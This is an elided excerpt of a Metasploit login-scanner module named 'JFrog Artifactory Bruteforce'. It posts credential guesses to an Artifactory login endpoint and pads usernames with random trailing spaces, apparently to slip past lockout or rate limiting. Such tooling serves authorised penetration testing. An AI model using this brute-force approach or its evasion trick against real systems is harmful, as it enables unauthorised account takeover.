...
module Metasploit
  module Framework
    module LoginScanner
      class JFrogArtifactory < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          ...
          begin
            ...
            post = {
              'user' => credential.public + (" " * Random.rand(50)),
              'password' => credential.private,
              'type' => 'login'
            }

            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'ui/auth/login',
              'method' => 'POST',
...
class MetasploitModule < Msf::Auxiliary
  ...
  def initialize
    super(
        'Name'           => 'JFrog Artifactory Bruteforce',
        'Description'    => %q(
  ...
  def run_host(ip)
    ...
    scanner = Metasploit::Framework::LoginScanner::JFrogArtifactory.new(
